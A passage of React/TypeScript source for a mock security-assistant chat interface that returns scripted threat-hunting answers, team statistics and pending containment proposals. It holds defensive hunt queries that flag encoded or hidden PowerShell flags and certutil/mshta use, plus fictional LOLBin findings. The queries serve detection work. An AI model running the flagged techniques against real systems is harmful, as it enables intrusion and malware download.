        response: 'Added to scheduled hunts. Will run daily at 02:00 UTC.\n\nConfiguration:\n• Name: "LOLBins in CI/CD Infrastructure"\n• Scope: 34 CI/CD hosts (tag: ci-cd-infra)\n• Frequency: Daily at 02:00 UTC\n• Lookback: 24 hours\n• Auto-action: Create proposal if findings > 0\n• Notify: James Spiteri, Marcus Rivera\n\nFirst scheduled run tonight. Historical hunt (7-day) already complete with 2 findings.',
        attachments: [{ type: 'stats', data: { title: 'Scheduled hunt', items: [{ label: 'Frequency', value: 'Daily 02:00' }, { label: 'Scope', value: '34 hosts' }, { label: 'Lookback', value: '24h' }, { label: 'Status', value: 'Active' }] } }],
      },
    ],
    attachments: [
      {
        type: 'timeline',
        data: {
          title: 'Hunt progress',
          events: [
            { time: 'Now', action: 'Scoping: 34 CI/CD hosts identified', severity: 'medium' },
            { time: '+10s', action: 'Querying: 7-day process execution logs', severity: 'medium' },
            { time: '+45s', action: 'Found: certutil.exe on build-runner-07', severity: 'critical' },
            { time: '+60s', action: 'Found: mshta.exe on artifact-srv-02', severity: 'high' },
            { time: '+90s', action: 'Analysis: certutil usage is anomalous', severity: 'critical' },
          ],
        },
      },
    ],
  },
  {
    pattern: /hunt|proactive|find.*threat|search.*for|look.*for|check.*for|scan.*for|are there/i,
    watchType: 'dark_watch',
    response: `Starting hunt based on your hypothesis. I'll scope the relevant hosts, build and run the query, analyze results, and report findings.\n\nThis typically takes 1-5 minutes.`,
    followUps: [
      {
        label: 'Narrow to last 24h',
        watchType: 'dark_watch',
        response: 'Narrowed hunt window to last 24 hours. This reduces the data volume significantly and will return results faster.\n\nRe-running query with @timestamp >= now-24h... Results expected in ~30 seconds.',
      },
      {
        label: 'Add network data',
        watchType: 'dark_watch',
        response: 'Adding network flow data (logs-network_traffic*) to the hunt scope.\n\nThis adds connection metadata, DNS queries, and HTTP transactions to the analysis. Total indices now:\n• logs-endpoint.events.*\n• logs-system.*\n• logs-network_traffic.*\n\nRe-running with expanded data sources...',
      },
      {
        label: 'Show query being used',
        watchType: 'dark_watch',
        response: 'Current hunt query:\n\nFROM logs-endpoint.events.process*\n| WHERE @timestamp >= now() - 7 days\n  AND process.args : ("*-enc*", "*-nop*", "*hidden*", "*bypass*")\n  AND process.name IN ("powershell.exe", "cmd.exe", "wscript.exe")\n| STATS count = count() BY host.name, process.name, process.command_line\n| WHERE count > 3\n| SORT count DESC\n\nThis looks for suspicious command-line patterns across your endpoint fleet with a frequency threshold to reduce noise.',
      },
    ],
    attachments: [
      {
        type: 'timeline',
        data: {
          title: 'Hunt execution',
          events: [
            { time: 'Now', action: 'Scoping data sources and host population', severity: 'medium' },
            { time: '+15s', action: 'Building ES|QL queries from hypothesis', severity: 'medium' },
            { time: '+30s', action: 'Running across 7-day event window', severity: 'medium' },
            { time: '+2m', action: 'Analysis complete — generating findings', severity: 'medium' },
          ],
        },
      },
    ],
  },
  {
    pattern: /who|team|analyst|people|usage/i,
    watchType: 'watch_floor',
    response: `Your team's Daybreak usage this week:\n\n• James Spiteri — 42 decisions, 89% approval rate\n• Sarah Chen — 31 decisions, 94% approval rate\n• Marcus Rivera — 18 decisions, 78% approval rate\n• Dima Kozlov — 12 decisions, 95% approval rate`,
    followUps: [
      {
        label: 'Show my decisions',
        watchType: 'watch_floor',
        response: 'Your 42 decisions this week:\n\n• Approved: 37 (88%)\n• Rejected: 3 (7%) — all were overly broad isolation proposals\n• Modified: 2 (5%) — you tightened scope before approving\n\nMost common: rule suppressions (18), containment actions (12), hunt approvals (8), rule deployments (4).\n\nAverage decision time: 45 seconds. Fastest: 4 seconds (auto-approved scheduled hunt).',
        attachments: [{ type: 'stats', data: { title: 'Your week', items: [{ label: 'Decisions', value: '42' }, { label: 'Approval rate', value: '88%' }, { label: 'Avg time', value: '45s' }, { label: 'Modified', value: '2' }] } }],
      },
      {
        label: 'Compare to last week',
        watchType: 'watch_floor',
        response: 'Week-over-week comparison:\n\n• Total decisions: 103 → 103 (flat)\n• Approval rate: 85% → 89% (+4%, fewer bad proposals)\n• Avg decision time: 52s → 45s (-13%, team getting faster)\n• Critical proposals: 5 → 3 (-40%, fewer incidents)\n\nThe improvement in proposal quality is driven by the Watch Floor learning from rejections — it now pre-filters proposals that match patterns your team previously rejected.',
        attachments: [{ type: 'stats', data: { title: 'Week-over-week', items: [{ label: 'Decisions', value: '103 → 103' }, { label: 'Approval rate', value: '85% → 89%' }, { label: 'Decision time', value: '52s → 45s' }, { label: 'Quality trend', value: '↑ improving' }] } }],
      },
      {
        label: 'Who rejected the most?',
        watchType: 'watch_floor',
        response: 'Rejection breakdown by team member:\n\n1. Marcus Rivera — 4 rejections (22% rejection rate)\n   - All were network isolation proposals he deemed too broad\n2. James Spiteri — 3 rejections (7% rejection rate)\n   - Scope concerns on containment actions\n3. Sarah Chen — 2 rejections (6% rejection rate)\n   - Rule FP rate too high\n4. Dima Kozlov — 1 rejection (8% rejection rate)\n   - Duplicate of existing rule\n\nMarcus\'s higher rejection rate is actually useful — his feedback is training the Watch Officer to propose more targeted isolations.',
      },
    ],
    attachments: [
      {
        type: 'stats',
        data: {
          title: 'Team this week',
          items: [
            { label: 'Total decisions', value: '103' },
            { label: 'Avg approval rate', value: '89%' },
            { label: 'Hours saved', value: '88' },
            { label: 'Active users', value: '4' },
          ],
        },
      },
    ],
  },
  {
    pattern: /help|what can you|what.*do|capabilities/i,
    watchType: 'watch_floor',
    response: `I can help you with:\n\n• Investigating threats — ask about any alert, host, user, or indicator\n• Taking response actions — isolate hosts, block IPs, disable accounts\n• Running threat hunts — give me a hypothesis and I'll scope and execute\n• Writing detection rules — describe behavior and I'll draft EQL/ES|QL\n• Understanding proposals — ask "why" about any Watch decision\n\nJust ask in natural language. I'll route to the right Watch.`,
    followUps: [
      {
        label: 'Show current status',
        watchType: 'watch_floor',
        response: 'Here\'s your current status:\n\n• Watch Floor is triaging 23 new alerts — 19 auto-classified, 4 need enrichment\n• Watch Officer is waiting on your approval for lateral movement containment\n• Dark Watch is mid-hunt: checking for LOLBins in CI/CD hosts\n• Deep Watch is analyzing the memory dump from dev-ws-14\n\n8 proposals are pending your decision, 3 are critical severity.',
        attachments: [{ type: 'stats', data: { title: 'Current state', items: [{ label: 'Pending proposals', value: '8' }, { label: 'Critical', value: '3' }, { label: 'Auto-actions today', value: '47' }, { label: 'Watches active', value: '4/4' }] } }],
      },
      {
        label: 'Start a hunt',
        watchType: 'dark_watch',
        response: 'What would you like to hunt for? Give me a hypothesis and I\'ll scope the hosts, build queries, and execute.\n\nExamples:\n• "Hunt for credential dumping on domain controllers"\n• "Look for persistence mechanisms created in the last 48h"\n• "Check for lateral movement from any service account"\n• "Find processes communicating with rare external IPs"\n\nOr just describe suspicious behavior in plain language.',
      },
      {
        label: 'Show pending proposals',
        watchType: 'watch_floor',
        response: '8 pending proposals:\n\n🔴 Critical (3):\n1. Isolate jump-box-03 (Watch Officer, 2h ago)\n2. Rotate svc-backup-prod credentials (Watch Officer, 1h ago)\n3. Deploy DLL side-loading rules (Dark Watch, 45 min ago)\n\n🟡 High (3):\n4. Suppress 3 noisy rules in staging environment (Watch Floor, 3h ago)\n5. Expand hunt scope to full fleet (Dark Watch, 1h ago)\n6. Add build-runner-07 to monitoring watchlist (Watch Floor, 30 min ago)\n\n🔵 Medium (2):\n7. Schedule weekly IOC sweep (Deep Watch, 4h ago)\n8. Update DNS tunnel detection threshold (Watch Floor, 5h ago)',
      },
    ],
  },
];

const QUICK_ACCESS_HUNTS: ResponseDef = {
  pattern: /hunt/i,
  watchType: 'dark_watch',
  response: 'Here are your recent hunts:\n\n• LOLBins in CI/CD — completed 2h ago, 2 findings (critical)\n• Kerberoasting attempts — running now, 45% complete\n• DNS tunneling to rare TLDs — completed yesterday, 0 findings\n• Credential access on jump servers — completed 3d ago, 1 finding (high)\n• Persistence via scheduled tasks — scheduled for tonight',
  followUps: [
    {
      label: 'Show LOLBin findings',
      watchType: 'dark_watch',
      response: 'LOLBin hunt findings (completed 2h ago):\n\n**Finding 1 — Critical:**\ncertutil.exe on build-runner-07, used to download remote binary from known C2 IP. Blocked by endpoint protection.\n\n**Finding 2 — High:**\nmshta.exe on artifact-srv-02, executed an inline VBScript. Origin: scheduled task created by unknown account "svc-deploy-temp" (not in AD).\n\nBoth hosts are CI/CD infrastructure. Recommend immediate investigation of the "svc-deploy-temp" account.',
      attachments: [{ type: 'timeline', data: { title: 'LOLBin findings', events: [{ time: '03:14', action: 'certutil.exe download on build-runner-07', severity: 'critical' }, { time: '03:22', action: 'mshta.exe VBScript on artifact-srv-02', severity: 'high' }] } }],
    },
    {
      label: 'Cancel Kerberoasting hunt',
      watchType: 'dark_watch',
      response: 'Kerberoasting hunt cancelled. It was 45% complete (scanning domain controllers).\n\nNo findings so far in the portion already scanned. Want me to reschedule for off-hours, or was this a priority concern?',
    },
    {
      label: 'Start a new hunt',
      watchType: 'dark_watch',
      response: 'Ready to hunt. Give me a hypothesis — what behavior or threat are you looking for?\n\nI\'ll scope the hosts, select data sources, build ES|QL queries, and execute. Typical hunt takes 1-5 minutes depending on scope.\n\nRecent effective hunts from your team:\n• Process injection via NtCreateThreadEx\n• SSH keys added to authorized_keys outside change windows\n• Binaries running from temp directories with network connections',
    },
  ],
  attachments: [
    {
      type: 'stats',
      data: {
        title: 'Hunt metrics (30d)',
        items: [
          { label: 'Hunts run', value: '23' },
          { label: 'Findings', value: '7' },
          { label: 'Avg duration', value: '4.2 min' },
          { label: 'True positive rate', value: '71%' },
        ],
      },
    },
  ],
};

const QUICK_ACCESS_LOGS: ResponseDef = {
  pattern: /log/i,
  watchType: 'watch_floor',
  response: 'Last 5 queries executed by the Watches:\n\n1. Dark Watch — `FROM logs-endpoint* WHERE process.name IN ("certutil","mshta") | STATS count() BY host.name` — 34 hosts, 2 hits\n2. Watch Officer — `FROM logs-system.auth* WHERE user.name == "svc-backup-prod" | SORT @timestamp DESC` — 847 events\n3. Watch Floor — `FROM .alerts-security* WHERE kibana.alert.severity == "critical" | STATS count() BY rule.name` — 12 rules\n4. Deep Watch — `FROM logs-endpoint* WHERE dll.hash.sha256 == "a4f2..."` — 3 hosts\n5. Dark Watch — `FROM logs-network_traffic* WHERE dns.question.name LIKE "*.update-check.cloud"` — 0 hits',
  followUps: [
    {
      label: 'Re-run query #1',
      watchType: 'dark_watch',
      response: 'Re-running: `FROM logs-endpoint* WHERE process.name IN ("certutil","mshta") | STATS count() BY host.name`\n\nResults (updated):\n• build-runner-07: certutil.exe — 1 execution (same finding as before)\n• artifact-srv-02: mshta.exe — 1 execution (same finding)\n• No new hits since last run (2h ago)\n\nThe 34 CI/CD hosts remain clean aside from these 2 known findings.',
      attachments: [{ type: 'stats', data: { title: 'Query #1 results', items: [{ label: 'Hosts scanned', value: '34' }, { label: 'Hits', value: '2' }, { label: 'New since last', value: '0' }] } }],
    },
    {
      label: 'Show full results for #2',
      watchType: 'watch_officer',
      response: 'Full results for svc-backup-prod auth query (847 events):\n\nTop patterns:\n• Normal backup operations (jump-box-03 → file servers): 812 events (96%)\n• Interactive logons (unusual): 14 events (1.7%) ← all on attack day\n• Failed auth attempts: 21 events (2.5%) ← 18 against dc-prod-01\n\nThe 14 interactive logons all occurred between 14:23–14:28 on the attack day. Prior to that, this account only used batch/service logon types for 90+ days.',
      attachments: [{ type: 'stats', data: { title: 'svc-backup-prod auth', items: [{ label: 'Total events', value: '847' }, { label: 'Normal ops', value: '96%' }, { label: 'Suspicious', value: '14' }, { label: 'Failed', value: '21' }] } }],
    },
    {
      label: 'Export all queries',
      watchType: 'watch_floor',
      response: 'Exported all 5 recent queries to your clipboard in ES|QL format. You can paste them directly into the Security > Discover query bar.\n\nAlso saved to: /investigations/queries/export-2024-04-15.ndjson\n\nThis file can be imported into any Kibana instance with the same data views configured.',
    },
  ],
};

const DEFAULT_RESPONSE: ResponseDef = {
  pattern: /.*/,
  watchType: 'dark_watch',
  response: `Got it. Let me work on that.\n\nI'm scoping this across all available data sources. I'll check endpoint telemetry, network logs, and identity events for anything matching your question.`,
  followUps: [
    {
      label: 'Narrow the scope',
      watchType: 'dark_watch',
      response: 'What specific hosts, users, or time range should I focus on?\n\nI can narrow by:\n• Host names or tags (e.g., "just CI/CD hosts", "only domain controllers")\n• User accounts (e.g., "service accounts only")\n• Time range (e.g., "last 24 hours", "between March 2-5")\n• Data source (e.g., "endpoint events only", "network + DNS")\n\nThe narrower the scope, the faster and more precise the results.',
    },
    {
      label: 'Show data sources',
      watchType: 'watch_floor',
      response: 'Available data sources and their coverage:\n\n• logs-endpoint.events.* — 2,400 hosts, 90 days retention\n• logs-system.auth* — 2,400 hosts, 90 days\n• logs-network_traffic.* — perimeter + internal core switches, 30 days\n• logs-dns.* — all internal resolvers, 60 days\n• logs-firewall.* — perimeter firewalls, 90 days\n• logs-cloud.* — AWS CloudTrail + Azure AD, 90 days\n• .alerts-security.* — all detection alerts, 365 days\n\nTotal searchable volume: ~4.2 TB across 7-day default window.',
      attachments: [{ type: 'stats', data: { title: 'Data sources', items: [{ label: 'Indices', value: '7' }, { label: 'Hosts covered', value: '2,400' }, { label: 'Max retention', value: '365 days' }, { label: 'Total volume', value: '4.2 TB' }] } }],
    },
    {
      label: 'Try a different approach',
      watchType: 'dark_watch',
      response: 'Here are some alternative ways to approach this:\n\n• **Be more specific** — name a host, user, IP, or process you\'re curious about\n• **Ask about a technique** — "How would an attacker do X in our environment?"\n• **Start from an alert** — "Explain alert SEC-12345" or "Why did rule X fire?"\n• **Describe behavior** — "Find processes that connect to rare IPs after midnight"\n• **Use a known framework** — "Check MITRE T1059 coverage" or "Hunt for TA0004"\n\nI work best with a clear hypothesis or specific indicator. What are you trying to find?',
    },
  ],
  attachments: [
    {
      type: 'timeline',
      data: {
        title: 'Working...',
        events: [
          { time: 'Now', action: 'Parsing request and identifying data sources', severity: 'medium' },
          { time: '+5s', action: 'Building queries across indices', severity: 'medium' },
          { time: '+20s', action: 'Executing across 7-day window', severity: 'medium' },
        ],
      },
    },
  ],
};


const fadeIn = keyframes`
  from { opacity: 0; transform: translateY(6px); }
  to { opacity: 1; transform: translateY(0); }
`;

const pulseGlow = keyframes`
  0%, 100% { box-shadow: 0 0 4px currentColor; opacity: 0.7; }
  50% { box-shadow: 0 0 12px currentColor; opacity: 1; }
`;

export const AskSurface: React.FC = () => {
  const [query, setQuery] = useState('');
  const [messages, setMessages] = useState<Message[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [typingWatch, setTypingWatch] = useState<WatchType | null>(null);
  const [mode, setMode] = useState<Mode>('ask');
  const endRef = useRef<HTMLDivElement>(null);
  const counterRef = useRef(0);

  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const handleFollowUp = useCallback((followUp: FollowUp) => {
    counterRef.current += 1;
    const userMsg: Message = { id: `msg-${counterRef.current}`, role: 'user', text: followUp.label };
    setMessages((prev) => [...prev, userMsg]);

    setIsTyping(true);
    setTypingWatch(followUp.watchType);
    setTimeout(() => {
      counterRef.current += 1;
      const watchMsg: Message = {
        id: `msg-${counterRef.current}`,
        role: 'watch',
        text: followUp.response,
        watchType: followUp.watchType,
        attachments: followUp.attachments,
      };
      setMessages((prev) => [...prev, watchMsg]);
      setIsTyping(false);
      setTypingWatch(null);
    }, 600 + Math.random() * 800);
  }, []);

  const handleSubmit = useCallback(() => {
    if (!query.trim() || isTyping) return;

    const text = query.trim();

    if (INVESTIGATION_TRIGGERS.test(text)) {
      setMode('investigation');
      setQuery('');
      return;
    }

    counterRef.current += 1;
    const userMsg: Message = { id: `msg-${counterRef.current}`, role: 'user', text };
    setMessages((prev) => [...prev, userMsg]);
    setQuery('');

    const match = RESPONSES.find((r) => r.pattern.test(text))
      || MORE_RESPONSES.find((r) => r.pattern.test(text))
      || DEFAULT_RESPONSE;

    setIsTyping(true);
    setTypingWatch(match.watchType);
    setTimeout(() => {
      counterRef.current += 1;
      const watchMsg: Message = {
        id: `msg-${counterRef.current}`,
        role: 'watch',
        text: match.response,
        watchType: match.watchType,
        attachments: match.attachments,
        followUps: match.followUps,
      };
      setMessages((prev) => [...prev, watchMsg]);
      setIsTyping(false);
      setTypingWatch(null);
    }, 600 + Math.random() * 800);
  }, [query, isTyping]);

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleSubmit(); }
  };

  const triggerQuickAccess = useCallback((type: 'hunts' | 'logs' | 'esql') => {
    if (type === 'esql') {
      setQuery('FROM ');
      return;
    }
    const match = type === 'hunts' ? QUICK_ACCESS_HUNTS : QUICK_ACCESS_LOGS;
    counterRef.current += 1;
    const userMsg: Message = {
      id: `msg-${counterRef.current}`,
      role: 'user',
      text: type === 'hunts' ? 'Show me recent hunts' : 'Show recent query logs',
    };
    setMessages((prev) => [...prev, userMsg]);
    setIsTyping(true);
    setTypingWatch(match.watchType);
    setTimeout(() => {
      counterRef.current += 1;
      const watchMsg: Message = {
        id: `msg-${counterRef.current}`,
        role: 'watch',
        text: match.response,
        watchType: match.watchType,
        attachments: match.attachments,
        followUps: match.followUps,
      };
      setMessages((prev) => [...prev, watchMsg]);
      setIsTyping(false);
      setTypingWatch(null);
    }, 400 + Math.random() * 500);
  }, []);

  const examples = [
    'What\'s the current status across all watches?',
    'Show me the lateral movement timeline',
    'How much are the watches costing us?',
    'Hunt for process injection in our environment',
    'What MITRE coverage gaps do we have?',
    'Who on my team is using Daybreak the most?',
  ];


  if (mode === 'investigation') {
    return (
      <div css={css`display: flex; flex-direction: column; height: calc(100vh - 260px); min-height: 400px;`}>
        {/* Mode toggle */}
        <div css={css`display: flex; align-items: center; gap: 8px; margin-bottom: 12px;`}>
          <button
            onClick={() => setMode('ask')}
            css={css`
              padding: 5px 12px; border-radius: 6px; font-size: 12px; font-weight: 500;
              background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08);
              color: rgba(255, 255, 255, 0.4); cursor: pointer;
              transition: all 0.12s ease;
              &:hover { color: rgba(255, 255, 255, 0.7); border-color: rgba(255, 255, 255, 0.15); }
            `}
          >
            ← Back to Ask
          </button>
          <span css={css`
            padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600;
            background: rgba(240, 78, 152, 0.1); border: 1px solid rgba(240, 78, 152, 0.25);
            color: #f04e98; letter-spacing: 0.03em;
          `}>
            Investigation Mode
          </span>
        </div>

        <div css={css`flex: 1; overflow-y: auto;`}>
          <InvestigationThread
            messages={INVESTIGATION_MESSAGES}
            participants={INVESTIGATION_PARTICIPANTS}
            incidentTitle="Lateral Movement via svc-backup-prod — Active Containment"
          />
        </div>

        {/* Input */}
        <div css={css`position: relative; flex-shrink: 0; margin-top: 16px;`}>
          <textarea
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="Add to investigation thread..."
            rows={2}
            css={css`
              width: 100%; padding: 14px 16px; padding-right: 80px;
              background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08);
              border-radius: 10px; color: #fff; font-size: 15px; line-height: 1.5;
              resize: none; outline: none; font-family: inherit;
              transition: border-color 0.12s ease;
              &:focus { border-color: rgba(240, 78, 152, 0.3); }
              &::placeholder { color: rgba(255, 255, 255, 0.2); }
            `}
          />
          {query.trim() && (
            <button onClick={handleSubmit} css={css`
              position: absolute; right: 12px; bottom: 12px; padding: 6px 14px;
              background: #f04e98; color: #fff; font-size: 12px; font-weight: 700;
              border: none; border-radius: 6px; cursor: pointer;
              &:hover { opacity: 0.85; }
            `}>
              Send
            </button>
          )}
        </div>
      </div>
    );
  }


  return (
    <div css={css`display: flex; flex-direction: column; height: calc(100vh - 260px); min-height: 400px;`}>
      {/* Messages */}
      <div css={css`flex: 1; overflow-y: auto; margin-bottom: 24px;`}>
        {messages.length === 0 ? (
          <div css={css`padding-top: 20px;`}>
            {/* Active Investigations */}
            <div css={css`margin-bottom: 28px;`}>
              <div css={css`font-size: 10px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: rgba(240, 78, 152, 0.7); margin-bottom: 10px;`}>Active Investigation</div>
              <button
                onClick={() => setMode('investigation')}
                css={css`
                  width: 100%; text-align: left; padding: 16px 18px;
                  background: rgba(240, 78, 152, 0.04);
                  border: 1px solid rgba(240, 78, 152, 0.15);
                  border-radius: 10px; cursor: pointer;
                  transition: all 0.15s ease;
                  &:hover { background: rgba(240, 78, 152, 0.08); border-color: rgba(240, 78, 152, 0.3); }
                `}
              >
                <div css={css`font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 4px;`}>
                  Lateral movement — svc-backup-prod
                </div>
                <div css={css`display: flex; align-items: center; gap: 12px;`}>
                  <span css={css`font-size: 12px; color: rgba(255, 255, 255, 0.35);`}>3 participants</span>
                  <span css={css`font-size: 12px; color: #f04e98; font-weight: 500;`}>Click to join thread →</span>
                </div>
              </button>
            </div>

            <div css={css`font-size: 11px; font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; color: rgba(255, 255, 255, 0.2); margin-bottom: 14px;`}>Try asking</div>
            <div css={css`display: flex; flex-direction: column; gap: 4px;`}>
              {examples.map((text, i) => (
                <button key={i} onClick={() => setQuery(text)} css={css`text-align: left; padding: 12px 0; background: none; border: none; border-bottom: 1px solid rgba(255, 255, 255, 0.025); color: rgba(255, 255, 255, 0.4); font-size: 14px; cursor: pointer; transition: color 0.12s ease; &:hover { color: rgba(255, 255, 255, 0.7); } &:last-child { border-bottom: none; }`}>
                  {text}
                </button>
              ))}
            </div>
          </div>
        ) : (
          <div css={css`display: flex; flex-direction: column; gap: 24px; padding-top: 8px;`}>
            {messages.map((msg) => (
              <div key={msg.id} css={css`animation: ${fadeIn} 0.25s ease both;`}>
                {msg.role === 'user' ? (
                  <div css={css`font-size: 15px; color: #fff; line-height: 1.6;`}>{msg.text}</div>
                ) : (
                  <div>
                    <div css={css`display: flex; align-items: center; gap: 8px; margin-bottom: 8px;`}>
                      <span css={css`width: 8px; height: 8px; border-radius: 50%; background: ${WATCH_CONFIGS[msg.watchType!].color};`} />
                      <span css={css`font-size: 12px; font-weight: 600; color: ${WATCH_CONFIGS[msg.watchType!].color};`}>{WATCH_CONFIGS[msg.watchType!].name}</span>
                    </div>
                    <div css={css`font-size: 14px; color: rgba(255, 255, 255, 0.6); line-height: 1.8; white-space: pre-wrap; max-width: 680px; margin-bottom: ${msg.attachments ? '16px' : '0'};`}>
                      {msg.text}
                    </div>
                    {msg.attachments && (
                      <div css={css`display: flex; flex-direction: column; gap: 12px; margin-bottom: 14px;`}>
                        {msg.attachments.map((att, i) => (
                          <AttachmentWidget key={i} attachment={att} watchColor={WATCH_CONFIGS[msg.watchType!].color} />
                        ))}
                      </div>
                    )}
                    {msg.followUps && (
                      <div css={css`display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px;`}>
                        {msg.followUps.map((followUp, i) => (
                          <button
                            key={i}
                            onClick={() => handleFollowUp(followUp)}
                            css={css`
                              padding: 6px 14px; border-radius: 16px; font-size: 12px; font-weight: 500;
                              background: rgba(255, 255, 255, 0.04);
                              border: 1px solid rgba(255, 255, 255, 0.1);
                              color: rgba(255, 255, 255, 0.55); cursor: pointer;
                              transition: all 0.15s ease;
                              &:hover {
                                background: rgba(${msg.watchType === 'watch_floor' ? '72, 239, 207' : msg.watchType === 'watch_officer' ? '106, 173, 255' : msg.watchType === 'dark_watch' ? '254, 197, 20' : '240, 78, 152'}, 0.08);
                                border-color: ${WATCH_CONFIGS[msg.watchType!].color}44;
                                color: ${WATCH_CONFIGS[msg.watchType!].color};
                              }
                            `}
                          >
                            {followUp.label}
                          </button>
                        ))}
                        {INVESTIGATION_TRIGGERS.test(msg.text) && (
                          <button
                            onClick={() => setMode('investigation')}
                            css={css`
                              padding: 6px 14px; border-radius: 16px; font-size: 12px; font-weight: 500;
                              background: rgba(240, 78, 152, 0.06);
                              border: 1px solid rgba(240, 78, 152, 0.2);
                              color: rgba(240, 78, 152, 0.8); cursor: pointer;
                              transition: all 0.15s ease;
                              &:hover { background: rgba(240, 78, 152, 0.12); border-color: rgba(240, 78, 152, 0.4); color: #f04e98; }
                            `}
                          >
                            Join investigation
                          </button>
                        )}
                      </div>
                    )}
                  </div>
                )}
              </div>
            ))}
            {isTyping && typingWatch && (
              <div css={css`display: flex; align-items: center; gap: 8px; animation: ${fadeIn} 0.2s ease both;`}>
                <span css={css`
                  width: 8px; height: 8px; border-radius: 50%;
                  background: ${WATCH_CONFIGS[typingWatch].color};
                  color: ${WATCH_CONFIGS[typingWatch].color};
                  animation: ${pulseGlow} 1.5s ease-in-out infinite;
                `} />
                <span css={css`font-size: 13px; color: ${WATCH_CONFIGS[typingWatch].color}99;`}>
                  {WATCH_CONFIGS[typingWatch].name} is thinking
                </span>
                <span css={css`display: inline-flex; gap: 3px; @keyframes dotBounce { 0%, 80%, 100% { opacity: 0.2; } 40% { opacity: 0.8; } } span { width: 4px; height: 4px; border-radius: 50%; background: ${WATCH_CONFIGS[typingWatch].color}88; } span:nth-of-type(1) { animation: dotBounce 1.2s infinite 0s; } span:nth-of-type(2) { animation: dotBounce 1.2s infinite 0.2s; } span:nth-of-type(3) { animation: dotBounce 1.2s infinite 0.4s; }`}>
                  <span /><span /><span />
                </span>
              </div>
            )}
            <div ref={endRef} />
          </div>
        )}
      </div>

      {/* Quick access + Input */}
      <div css={css`position: relative; flex-shrink: 0;`}>
        <div css={css`display: flex; gap: 8px; margin-bottom: 10px;`}>
          <button
            onClick={() => triggerQuickAccess('hunts')}
            css={css`
              padding: 5px 12px; border-radius: 6px; font-size: 12px;
              background: rgba(255, 255, 255, 0.025); border: 1px solid rgba(255, 255, 255, 0.06);
              color: rgba(255, 255, 255, 0.4); cursor: pointer;
              transition: all 0.12s ease;
              &:hover { background: rgba(254, 197, 20, 0.06); border-color: rgba(254, 197, 20, 0.2); color: rgba(254, 197, 20, 0.8); }
            `}
          >
            📋 Recent hunts
          </button>
          <button
            onClick={() => triggerQuickAccess('logs')}
            css={css`
              padding: 5px 12px; border-radius: 6px; font-size: 12px;
              background: rgba(255, 255, 255, 0.025); border: 1px solid rgba(255, 255, 255, 0.06);
              color: rgba(255, 255, 255, 0.4); cursor: pointer;
              transition: all 0.12s ease;
              &:hover { background: rgba(72, 239, 207, 0.06); border-color: rgba(72, 239, 207, 0.2); color: rgba(72, 239, 207, 0.8); }
            `}
          >
            📊 Query logs
          </button>
          <button
            onClick={() => triggerQuickAccess('esql')}
            css={css`
              padding: 5px 12px; border-radius: 6px; font-size: 12px;
              background: rgba(255, 255, 255, 0.025); border: 1px solid rgba(255, 255, 255, 0.06);
              color: rgba(255, 255, 255, 0.4); cursor: pointer;
              transition: all 0.12s ease;
              &:hover { background: rgba(106, 173, 255, 0.06); border-color: rgba(106, 173, 255, 0.2); color: rgba(106, 173, 255, 0.8); }
            `}
          >
            🔍 Run ES|QL
          </button>
        </div>
        <textarea
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="Ask any watch a question..."
          rows={2}
          css={css`width: 100%; padding: 14px 16px; padding-right: 80px; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; color: #fff; font-size: 15px; line-height: 1.5; resize: none; outline: none; font-family: inherit; transition: border-color 0.12s ease; &:focus { border-color: rgba(72, 239, 207, 0.3); } &::placeholder { color: rgba(255, 255, 255, 0.2); }`}
        />
        {query.trim() && (
          <button onClick={handleSubmit} css={css`position: absolute; right: 12px; bottom: 12px; padding: 6px 14px; background: #48efcf; color: #0a0e1a; font-size: 12px; font-weight: 700; border: none; border-radius: 6px; cursor: pointer; &:hover { opacity: 0.85; }`}>
            Ask
          </button>
        )}
      </div>
    </div>
  );
};


const AttachmentWidget: React.FC<{ attachment: Attachment; watchColor: string }> = ({ attachment, watchColor }) => {
  const { type, data } = attachment;
  const [hoveredHost, setHoveredHost] = useState<string | null>(null);

  const containerCss = css`
    padding: 14px 18px;
    border-radius: 10px;
    background: rgba(255, 255, 255, 0.02);
    border: 1px solid rgba(255, 255, 255, 0.05);
    animation: ${fadeIn} 0.3s ease both;
    transition: border-color 0.15s ease;
    &:hover { border-color: rgba(255, 255, 255, 0.08); }
  `;

  if (type === 'timeline') {
    const events = data.events as Array<{ time: string; action: string; severity: string }>;
    const sevColors: Record<string, string> = { critical: '#F04E98', high: '#FEC514', medium: 'rgba(255, 255, 255, 0.3)' };
    return (
      <div css={containerCss}>
        <div css={css`font-size: 11px; font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; color: rgba(255, 255, 255, 0.3); margin-bottom: 10px;`}>
          {data.title as string}
        </div>
        <div css={css`display: flex; flex-direction: column; gap: 0;`}>
          {events.map((evt, i) => (
            <div key={i} css={css`
              display: flex; align-items: flex-start; gap: 12px; padding: 6px 4px; position: relative;
              border-radius: 4px; cursor: default; transition: background 0.12s ease;
              &:hover { background: rgba(255, 255, 255, 0.025); }
              &::before { content: ''; position: absolute; left: 7px; top: 18px; bottom: -6px; width: 1px; background: ${i < events.length - 1 ? 'rgba(255, 255, 255, 0.04)' : 'transparent'}; }
            `}>
              <span css={css`width: 7px; height: 7px; border-radius: 50%; background: ${sevColors[evt.severity] || 'rgba(255, 255, 255, 0.2)'}; flex-shrink: 0; margin-top: 4px;`} />
              <span css={css`font-size: 12px; color: rgba(255, 255, 255, 0.3); font-variant-numeric: tabular-nums; flex-shrink: 0; width: 52px;`}>{evt.time}</span>
              <span css={css`font-size: 13px; color: rgba(255, 255, 255, 0.55); line-height: 1.3;`}>{evt.action}</span>
            </div>
          ))}
        </div>
      </div>
    );
  }

  if (type === 'rules') {
